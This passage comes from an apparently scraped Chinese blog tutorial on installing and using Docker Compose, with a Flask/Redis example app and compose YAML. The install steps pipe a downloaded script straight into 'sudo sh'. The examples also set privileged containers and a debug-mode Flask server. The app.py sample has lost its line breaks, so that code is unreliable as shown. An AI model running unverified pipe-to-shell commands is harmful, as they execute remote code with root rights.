\">environment</span><span class=\"\">:- DEBUG=false- SEND_EMAILS=false</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-5\">development<span class=\"crayon-o\">.</span>yml</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-6\"><span class=\"crayon-s \">web</span><span class=\"\">:extends</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-7\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-s \">file</span><span class=\"\">: common.yml</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-8\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-s \">service</span><span class=\"\">: webapp</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-9\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">ports</span><span class=\"\">:-\"8000</span><span class=\"\">:8000\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-10\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">links</span><span class=\"\">:- db</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-11\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">environment</span><span class=\"\">:- DEBUG=true</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-12\"><span class=\"crayon-s \">db</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-13\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">image</span><span class=\"\">: postgres</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0008 seconds] -->\n<p></p>\n<p><code>net</code>：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。<br>\n<code>dns</code>：可以设置一个或多个自定义的DNS地址。<br>\n<code>dns_search</code>:可以设置一个或多个DNS的扫描域。<br>\n其他的<code>working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares</code>，和<code>docker run</code>命令是一样的，这些命令都是单行的命令。例如：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c72058180962\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">cpu_shares:73\nworking_dir:/code\nentrypoint: /code/entrypoint.sh\nuser: postgresql\nhostname: foo\ndomainname: foo.com\nmem_limit:1000000000\nprivileged:true\nrestart: always\nstdin_open:true\ntty:true</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-11\">11</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-1\"><span class=\"crayon-v\">cpu_shares</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">73</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-2\"><span class=\"crayon-v\">working_dir</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">code</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-3\"><span class=\"crayon-v\">entrypoint</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">code</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">entrypoint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-4\"><span class=\"crayon-v\">user</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">postgresql</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-5\"><span class=\"crayon-v\">hostname</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-6\"><span class=\"crayon-v\">domainname</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">foo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-7\"><span class=\"crayon-v\">mem_limit</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1000000000</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-8\"><span class=\"crayon-v\">privileged</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-9\"><span class=\"crayon-v\">restart</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">always</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-10\"><span class=\"crayon-v\">stdin_open</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-11\"><span class=\"crayon-v\">tty</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0013 seconds] -->\n<p></p>\n<h2>4. docker-compose常用命令</h2>\n<p>在第二节中的<code>docker-compose up</code>，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：<br>\n<code>--verbose</code>：输出详细信息<br>\n<code>-f</code> 制定一个非docker-compose.yml命名的yaml文件<br>\n<code>-p</code> 设置一个项目名称（默认是directory名）<br>\ndocker-compose的动作包括：<br>\n<code>build</code>：构建服务<br>\n<code>kill -s SIGINT</code>：给服务发送特定的信号。<br>\n<code>logs</code>：输出日志<br>\n<code>port</code>：输出绑定的端口<br>\n<code>ps</code>：输出运行的容器<br>\n<code>pull</code>：pull服务的image<br>\n<code>rm</code>：删除停止的容器<br>\n<code>run</code>: 运行某个服务，例如docker-compose run web python manage.py shell<br>\n<code>start</code>：运行某个服务中存在的容器。<br>\n<code>stop</code>:停止某个服务中存在的容器。<br>\n<code>up</code>：create + run + attach容器到服务。<br>\n<code>scale</code>：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3<br>\n参考:<br>\n<a href=\"http://docs.docker.com/compose/\">Compose Document</a></p>\n\t\t\t\t\t\t<div class=\"clear\"></div>\n\t\t\t\t\t\t\t\t\t\t\t</div>\n                                            \n>转载:http://debugo.com/docker-compose\n                                   ","source":"_posts/Docker-Compose—简化复杂应用的利器.md","raw":"---\ntitle: 'Docker Compose—简化复杂应用的利器 '\ndate: 2016-10-15 19:10:35\ntags: docker\ncategories: docker\n---\n<div class=\"entry-content\">\n\t\t\t\t\t\t\t\t\t\t\t\t<p>Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。<span id=\"more-1319\"></span></p>\n<h2>1. 安装Docker和Compose</h2>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c25730712728\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\"># 当前最新的Docker是1.6.2，Compose为1.2.0\ncurl -s https://get.docker.io/ubuntu/ | sudo sh\nsudo apt-get update\nsudo apt-get install lxc-docker\n# 参考http://docs.docker.com/compose/install/#install-compose\ncurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose\nchmod +x /usr/local/bin/docker-compose\n### 上面这个方法真的慢出翔，可以通过Python pip安装。\napt-get install python-pip python-dev\npip install -U docker-compose</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c25730712728-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c25730712728-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c25730712728-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c25730712728-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c25730712728-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c25730712728-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c25730712728-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c25730712728-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c25730712728-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c25730712728-10\">10</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-1\"><span class=\"crayon-p\"># 当前最新的Docker是1.6.2，Compose为1.2.0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-2\"><span class=\"crayon-v\">curl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//get.docker.io/ubuntu/ | sudo sh</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-3\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">update</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-4\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">lxc</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">docker</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-5\"><span class=\"crayon-p\"># 参考http://docs.docker.com/compose/install/#install-compose</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-6\"><span class=\"crayon-v\">curl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">L</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-7\"><span class=\"crayon-v\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">compose</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-8\"><span class=\"crayon-p\">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-9\"><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">dev</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-10\"><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">U</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">compose</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0020 seconds] -->\n<p></p>\n<p>这样compose就安装好了，查看一下compose的版本信息：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c44835397497\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">chmod +x /usr/local/bin/docker-compose\ndocker-compose -version\ndocker-compose 1.2.0</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c44835397497-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c44835397497-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c44835397497-3\">3</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c44835397497-1\"><span class=\"crayon-r\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">compose</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c44835397497-2\"><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">compose</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">version</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c44835397497-3\"><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">compose</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.2.0</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0011 seconds] -->\n<p></p>\n<h2>2. 使用Compose</h2>\n<p>使用Compose只需要简单的三个步骤：<br>\n首先，使用Dockerfile来定义你的应用环境：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c48878639680\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">FROM python:2.7\nADD ./code\nWORKDIR /code\nRUN pip install -r requirements.txt</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c48878639680-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c48878639680-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c48878639680-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c48878639680-4\">4</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c48878639680-1\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2.7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c48878639680-2\"><span class=\"crayon-i\">ADD</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">code</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c48878639680-3\"><span class=\"crayon-v\">WORKDIR</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c48878639680-4\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">requirements</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0008 seconds] -->\n<p></p>\n<p>其中，requirements.txt中的内容包括：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c4d809478886\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">flask\nredis</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c4d809478886-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c4d809478886-2\">2</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c4d809478886-1\"><span class=\"crayon-e\">flask</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c4d809478886-2\"><span class=\"crayon-v\">redis</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0003 seconds] -->\n<p></p>\n<p>再用Python写一个简单的app.py</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c51291884198\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">from flask importFlaskfrom redis importRedisimport os\napp =Flask(__name__)\nredis =Redis(host='redis', port=6379)@app.route('/')def hello():\n    redis.incr('hits')return'Hello World! I have been seen %s times.'% redis.get('hits')if __name__ ==\"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True)</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c51291884198-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c51291884198-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c51291884198-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c51291884198-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c51291884198-5\">5</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c51291884198-1\"><span class=\"crayon-st\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">flask </span><span class=\"crayon-e\">importFlaskfrom </span><span class=\"crayon-e\">redis </span><span class=\"crayon-e\">importRedisimport </span><span class=\"crayon-k \">os</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c51291884198-2\"><span class=\"crayon-v\">app</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">Flask</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">__name__</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c51291884198-3\"><span class=\"crayon-v\">redis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">Redis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'redis'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">port</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">6379</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">app</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">route</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'/'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-r\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">hello</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c51291884198-4\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">incr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'hits'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-st\">return</span><span class=\"crayon-s\">'Hello World! I have been seen %s times.'</span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'hits'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">__name__</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-s\">\"__main__\"</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c51291884198-5\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-v\">app</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"0.0.0.0\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">debug</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">True</span><span class=\"crayon-sy\">)</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0027 seconds] -->\n<p></p>\n<p><strong>第二步</strong>，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用。</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c55508636029\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">web:\n  build:.\n  command: python app.py\n  ports:\n         - \"5000:5000\"\n  volumes:\n         - .:/code\n  links:\n         - redis\nredis:\n  image: redis</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: 